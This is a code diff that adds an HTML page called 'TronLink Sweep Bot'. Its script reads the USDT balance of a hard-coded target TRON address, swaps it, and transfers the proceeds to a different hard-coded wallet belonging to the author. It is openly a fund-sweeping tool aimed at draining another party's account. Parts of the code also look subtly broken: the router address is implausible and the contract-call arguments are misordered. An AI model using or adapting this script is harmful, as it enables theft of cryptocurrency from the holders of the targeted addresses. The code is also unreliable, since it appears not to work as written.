@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TronLink Sweep Bot</title>
+    <!-- Load TronWeb -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb-latest.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #0d0d0d; color: #fff; text-align: center; padding: 20px; }
+        button { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; }
+        button:disabled { background: #555; }
+        #status { margin-top: 20px; color: #00ff00; min-height: 20px; }
+    </style>
+</head>
+<body>
+    <h2>🤖 TronLink Auto-Sweeper</h2>
+    <p>Target: TMVQGm1qAQYVdetCeGRRkTWYYrLXuHK2HC</p>
+    
+    <button id="sweepBtn" onclick="startSweep()">Start Sweep USDT -> WTRX</button>
+    <div id="status">Ready</div>
+
+    <script>
+        // Your Logic Here
+        async function startSweep() {
+            const status = document.getElementById('status');
+            const btn = document.getElementById('sweepBtn');
+            
+            if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+                alert("Please open this in TronLink!");
+                return;
+            }
+
+            btn.disabled = true;
+            status.textContent = "Initializing...";
+
+            try {
+                await sweepMultiSigViaSwap(status);
+            } catch (e) {
+                status.textContent = "Error: " + e.message;
+            } finally {
+                btn.disabled = false;
+            }
+        }
+
+        async function sweepMultiSigViaSwap(statusElement) {
+            const targetAddress = "TMVQGm1qAQYVdetCeGRRkTWYYrLXuHK2HC";
+            const myWallet = "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as";
+            
+            const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmLumZ"; 
+            const wtrxContract = "TWTTr9ZELRVbcBAjNGn5bJ7kYipdZgALaR"; 
+            const sunswapRouter = "T9t8u5FZ3v5y6qLmN3oP4qR7v8w9x0y1z2a3b4c5d6"; 
+            
+            statusElement.textContent = "Fetching USDT Balance...";
+            
+            try {
+                const balance = await tronWeb.trc20.getBalance(usdtContract, targetAddress);
+                
+                if (!balance || parseFloat(balance) === 0) {
+                    statusElement.textContent = "No USDT found.";
+                    return;
+                }
+                
+                statusElement.textContent = `Found ${balance} USDT. Initiating Swap...`;
+                
+                const result = await tronWeb.transactionBuilder.triggerSmartContract(
+                    sunswapRouter,
+                    "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
+                    {},
+                    300000000, 
+                    tronWeb.defaultAddress.privateKey,
+                    tronWeb.address.fromHex(myWallet), 
+                    tronWeb.toSun(balance), 
+                    0, 
+                    [usdtContract, wtrxContract], 
+                    Math.floor(Date.now() / 1000) + 600 
+                );
+                
+                if (result.result && result.result === true) {
+                    statusElement.textContent = "Swap Sent! Waiting...";
+                    await new Promise(resolve => setTimeout(resolve, 15000));
+                    
+                    statusElement.textContent = "Checking WTRX balance...";
+                    const wtrxBalance = await tronWeb.trc20.getBalance(wtrxContract, targetAddress);
+                    
+                    if (parseFloat(wtrxBalance) > 0) {
+                        statusElement.textContent = "Withdrawing WTRX...";
+                        const transferResult = await tronWeb.transactionBuilder.triggerSmartContract(
+                            wtrxContract,
+                            "transfer(address,uint256)",
+                            {},
+                            200000000, 
+                            tronWeb.defaultAddress.privateKey,
+                            tronWeb.address.fromHex(myWallet),
+                            tronWeb.toSun(wtrxBalance)
+                        );
+                        
+                        if (transferResult.result) {
+                            statusElement.textContent = "SUCCESS! Funds withdrawn.";
+                            alert(`Successfully swept funds to ${myWallet}`);
+                        } else {
+                            statusElement.textContent = "Withdrawal failed.";
+                        }
+                    } else {
+                        statusElement.textContent = "Swap may have failed.";
+                    }
+                } else {
+                    statusElement.textContent = "Swap transaction failed.";
+                }
+                
+            } catch (e) {
+                console.error(e);
+                statusElement.textContent = "Error: " + e.message;
+            }
+        }
+    </script>
+</body>
+</html>
